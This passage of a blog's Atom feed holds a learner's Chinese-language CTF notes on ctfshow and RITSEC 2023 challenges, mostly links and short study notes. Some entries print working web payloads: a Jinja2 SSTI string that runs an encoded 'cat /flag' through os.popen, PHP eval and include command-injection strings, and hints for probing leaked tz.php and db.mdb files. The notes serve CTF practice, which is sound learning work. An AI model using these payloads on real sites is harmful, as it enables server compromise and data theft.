    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.wlhhlc.top/posts/14827/&quot;&gt;https://www.wlhhlc.top/posts/14827/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;命令执行：&lt;/p&gt;
&lt;p&gt;41 55 56&lt;/p&gt;
&lt;p&gt;脚本没学why，做完了命令执行</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ctfshow愚人杯</title>
    <link href="http://van0308.github.io/2023/04/ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/"/>
    <id>http://van0308.github.io/2023/04/ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/</id>
    <published>2023-04-01T15:07:00.000Z</published>
    <updated>2023-04-07T13:36:44.352Z</updated>
    
    <content type="html"><![CDATA[<p>ctfshow{一个不能说的秘密}</p><p>ssti</p><p>过滤了&#x2F;</p><p>&#x2F;hello&#x2F;%7B%7Blipsum.<strong>globals</strong>[‘os’].popen(‘<code>echo &quot;Y2F0IC9mbGFn&quot;|base64 -d</code>‘).read()%7D%7D</p><p><a href="https://blog.csdn.net/destiny10242048/article/details/129916697">https://blog.csdn.net/destiny10242048/article/details/129916697</a></p><p>官方<a href="https://ctf-show.feishu.cn/docx/KTfvd3GCOodJrRxVnk5ck1LunYb">https://ctf-show.feishu.cn/docx/KTfvd3GCOodJrRxVnk5ck1LunYb</a></p><p>之前的</p><p><a href="https://www.cnblogs.com/Suica/p/16092730.html#/c/subject/p/16092730.html">https://www.cnblogs.com/Suica/p/16092730.html#/c/subject/p/16092730.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ctfshow{一个不能说的秘密}&lt;/p&gt;
&lt;p&gt;ssti&lt;/p&gt;
&lt;p&gt;过滤了&amp;#x2F;&lt;/p&gt;
&lt;p&gt;&amp;#x2F;hello&amp;#x2F;%7B%7Blipsum.&lt;strong&gt;globals&lt;/strong&gt;[‘os’].popen(‘&lt;code&gt;echo &amp;quo</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ritsecctf2023</title>
    <link href="http://van0308.github.io/2023/04/%E7%AB%9E%E8%B5%9B/ritsecctf2023/"/>
    <id>http://van0308.github.io/2023/04/%E7%AB%9E%E8%B5%9B/ritsecctf2023/</id>
    <published>2023-04-01T14:06:35.000Z</published>
    <updated>2023-04-07T13:03:54.847Z</updated>
    
    <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>Never gonna turn around giveyouup letyoudown desert you</p><p>没想到&#x2F;和|不用删掉的，然后顺序的话，根据歌词的顺序来拼接</p><p>RS{&#x2F;/eveRG0nna_<br><em>TuRna30unD</em><br>G1v3y0uuP<br><em>|3tY0|</em>|d0vvn_<br>_D3s3RTy0u}</p><p><code>RS&#123;/\/eveRG0nna_G1v3y0uuP_|3tY0|_|d0vvn__TuRna30unD__D3s3RTy0u&#125;</code></p><p>wp</p><p><a href="https://ctftime.org/event/1860/tasks/">https://ctftime.org/event/1860/tasks/</a></p><p><a href="https://www.leoreading.com/blog/ritsec-ctf-2023/web/pickle-store#/">https://www.leoreading.com/blog/ritsec-ctf-2023/web/pickle-store#/</a></p><h2 id="Broken-Bot"><a href="#Broken-Bot" class="headerlink" title="Broken Bot"></a>Broken Bot</h2><p><a href="https://www.leoreading.com/blog/ritsec-ctf-2023/web/broken-bot#/">https://www.leoreading.com/blog/ritsec-ctf-2023/web/broken-bot#/</a></p><p><a href="https://siunam321.github.io/ctf/RITSEC-CTF-2023/Web/Broken-Bot/">https://siunam321.github.io/ctf/RITSEC-CTF-2023/Web/Broken-Bot/</a></p><p><a href="https://gitlab.ritsec.cloud/competitions/ctf-2023-public/-/tree/master">https://gitlab.ritsec.cloud/competitions/ctf-2023-public/-/tree/master</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h3&gt;&lt;p&gt;Never gonna turn around giveyouup letyoudown desert you&lt;/p&gt;
&lt;p&gt;没想到</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ctfshowmisc入门</title>
    <link href="http://van0308.github.io/2023/03/ctfshow/web/ctfshowmisc%E5%85%A5%E9%97%A8/"/>
    <id>http://van0308.github.io/2023/03/ctfshow/web/ctfshowmisc%E5%85%A5%E9%97%A8/</id>
    <published>2023-03-31T14:25:42.000Z</published>
    <updated>2023-04-06T12:59:45.435Z</updated>
    
    <content type="html"><![CDATA[<h3 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h3><p>常见文件头尾</p><p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865">https://blog.csdn.net/xiangshangbashaonian/article/details/80156865</a></p><p><a href="https://blog.csdn.net/LYJ20010728/article/details/119193793">https://blog.csdn.net/LYJ20010728/article/details/119193793</a></p><p><a href="https://harvey.plus/index.php/archives/62/#toc-misc10">https://harvey.plus/index.php/archives/62/#toc-misc10</a></p><p><a href="https://www.cnblogs.com/sakura--tears/p/17148309.html">https://www.cnblogs.com/sakura--tears/p/17148309.html</a></p><p><a href="https://blog.csdn.net/Aluxian_/article/details/125831308">https://blog.csdn.net/Aluxian_/article/details/125831308</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;wp&quot;&gt;&lt;a href=&quot;#wp&quot; class=&quot;headerlink&quot; title=&quot;wp&quot;&gt;&lt;/a&gt;wp&lt;/h3&gt;&lt;p&gt;常见文件头尾&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/xiangshangbashaonian/arti</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>入门</title>
    <link href="http://van0308.github.io/2023/03/ctfshow/web/ctfshowweb%E5%85%A5%E9%97%A8/"/>
    <id>http://van0308.github.io/2023/03/ctfshow/web/ctfshowweb%E5%85%A5%E9%97%A8/</id>
    <published>2023-03-30T08:26:43.000Z</published>
    <updated>2023-03-30T08:26:47.972Z</updated>
    
    <content type="html"><![CDATA[<p>记录知识点，扫盲。</p><p>参考wp</p><p><a href="https://www.wlhhlc.top/posts/14827/">https://www.wlhhlc.top/posts/14827/</a></p><h3 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h3><p>探针，PHP探针</p><p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。是一个查看服务器信息的工具。<br>比如查看服务器支持什么，不支持什么，空间速度等等状况！</p><p>tz.php</p><p>mdb文件泄露</p><blockquote><p>mdb文件是早期asp+access构架的数据库文件</p></blockquote><p>于是我们访问&#x2F;db&#x2F;db.mdb</p><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>没看</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>有的过滤的是中文的符号，看清楚</p><h5 id="eval-c"><a href="#eval-c" class="headerlink" title="eval($c)"></a>eval($c)</h5><p>思路，嵌套——?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(“ls”);</p><p>分号过滤——用?&gt;代替</p><p>括号过滤——用include 函数（require等不带括号的函数）?c&#x3D;include%0a$_POST[1]?&gt; </p><p>结合伪协议，读取文件</p><p>短标签<?=xxx?>  会echo出来 <??>不会echo出来</p><p>读取文件函数</p><h3 id="无参数rce-待学"><a href="#无参数rce-待学" class="headerlink" title="无参数rce 待学"></a>无参数rce 待学</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(scandir(‘.’)); 查看当前目录下的所有文件名</span><br><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</span><br></pre></td></tr></table></figure><h6 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h6><p>41、</p><p>或、</p><h5 id="include-c"><a href="#include-c" class="headerlink" title="include($c)"></a>include($c)</h5><h5 id="题目拼接"><a href="#题目拼接" class="headerlink" title="题目拼接"></a>题目拼接</h5><p>system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt</span><br><span class="line">2：/dev/null 代表空设备文件</span><br><span class="line">3：2&gt; 表示stderr标准错误</span><br><span class="line">4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1</span><br><span class="line">5：1 表示stdout标准输出，系统默认值是1，所以&quot;&gt;/dev/null&quot;等同于 “1&gt;/dev/null”</span><br><span class="line">因此，&gt;/dev/null 2&gt;&amp;1 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</span><br><span class="line"></span><br><span class="line">那么本文标题的语句执行过程为：</span><br><span class="line">1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，也就是不显示任何信息。</span><br><span class="line">2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</span><br></pre></td></tr></table></figure><p>绕过：用<code>;</code>号或者<code>||</code>等等一些命令分隔符进行命令分隔</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac flag.php;</span><br></pre></td></tr></table></figure><p>无字母数字</p><p>56、57</p><p>$()</p><p>顺序</p><p>71  payload后面加上exit();</p><p>72 7577 118 后面都没</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>日志包含81后都没看</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录知识点，扫盲。&lt;/p&gt;
&lt;p&gt;参考wp&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.wlhhlc.top/posts/14827/&quot;&gt;https://www.wlhhlc.top/posts/14827/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;信息收集：&quot;&gt;&lt;a </summary>
      
    
    
    
    
  </entry>
  
</feed>
